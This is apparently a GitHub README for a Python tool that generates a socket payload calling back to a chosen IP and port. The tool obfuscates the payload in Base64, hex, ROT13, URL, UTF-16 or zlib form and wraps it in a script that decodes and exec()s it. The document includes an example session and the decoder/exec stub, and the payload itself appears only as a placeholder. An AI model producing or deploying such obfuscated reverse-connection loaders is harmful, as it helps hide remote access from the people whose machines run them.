# Payload Generator & Encoder 

**Payload Generator & Encoder** is a Python tool that generates a custom payload to connect to a remote server via socket, and then encodes it in various formats like Base64, Hex, ROT13, URL, UTF-16, and Zlib. This script can be used to create obfuscated payloads, often used in penetration testing or controlled environments to assess security.

## üìú Features 

- **Generate custom payload** to connect to a remote server via socket (using a given IP address and port). 
- **Encode the payload** in different formats: 
  - Base64 
  - Hex 
  - ROT13 
  - URL encoding 
  - UTF-16 
  - Zlib compression 
- **Generate a Python script** that can be run to decode and execute the payload. 
- **Interactive command line interface** to enter the necessary parameters and choose the encoding format. 

--- 

## ‚öôÔ∏è Prerequisites 

- Python 3.x 
- Standard Python libraries (no external dependencies required) 

--- 

## üõ† Installation 

1. Clone this repository to your machine: 
   ```bash 
[ https://github.com/HackfutSec/RshellCoders.git ``` 

2. Navigate to the project directory: 
   ```bash 
   cd RshellCoders 
   ``` 

--- 

## üöÄ Usage 

### 1. Run the script 

Run the `BlitzCoders.py` script: 

```bash 
python BlitzCoders.py 
``` 

### 2. Enter parameters 

- **IP**: Enter the target IP address. 
- **Port**: Enter the target port. 
- **Output filename**: Enter the filename for the generated Python script (without a `.py` extension). 
- **Encoding format**: Choose one of the following formats: 
  - **1**: Base64
  - **2**: Hex 
  - **3**: ROT13 
  - **4**: URL encoding 
  - **5**: UTF-16 
  - **6**: Zlib 

### 3. Execution example 

``` 
$ python BlitzCoders.py 

[CDX] Enter your IP: 192.168.1.10 
[CDX] Enter your port: 4444 
[CDX] Enter the output filename (without extension): payload_script 

[CDX] Choose the encoding format: 
1. base64 
2. hex 
3. rot13 
4. url 
5. utf-16 
6. zlib 

[CDX] Enter the number of the encoding format: 1 

[CDX] The script has been saved at: '/path/to/your/payload_script.py'. 
```

## üß≥ Code Explanation 

1. **Generating the Payload**: 
   - The `generate_payload(ip, port)` function generates a Python payload that connects to a server via a socket using the IP and port provided by the user. 
   
2. **Encoding the Payload**: 
   - The generated payload is then encoded in a format chosen by the user: Base64, Hex, ROT13, URL, UTF-16, or Zlib. 

3. **Creating the Python Script**: 
   - The `create_script(encoded_payload, encoding_format, output_filename)` function generates a Python script that includes the encoded payload and a decoding mechanism to execute the payload once the script is launched. 

4. **Payload Decoding and Execution**: 
   - When the generated script is executed, it decodes the payload according to the specified encoding and uses the `exec()` function to execute it.

### Example generated script: 

```python 
import base64 
import binascii 
import codecs 
import urllib.parse 
import zlib

def decode_payload(encoded_payload, encoding_format): 
    if encoding_format == 'base64': 
        return base64.b64decode(encoded_payload).decode('utf-8') 
    elif encoding_format == 'hex': 
        return binascii.unhexlify(encoded_payload).decode('utf-8') 
    elif encoding_format == 'rot13': 
        return codecs.decode(encoded_payload, 'rot_13') 
    elif encoding_format == 'url': 
        return urllib.parse.unquote(encoded_payload) 
    elif encoding_format == 'utf-16': 
        return encoded_payload.encode('latin-1').decode('utf-16') 
    elif encoding_format == 'zlib': 
        return zlib.decompress(bytes.fromhex(encoded_payload)).decode('utf-8') 
    else: 
        raise ValueError("Unrecognized encoding format.") 

if __name__ == "__main__": 
    encoded_payload = 'BASE64_ENCODED_PAYLOAD' 
    encoding_format = 'base64' 
    
    # Decode and execute the payload 
    exec(decode_payload(encoded_payload, encoding_format)) 
```
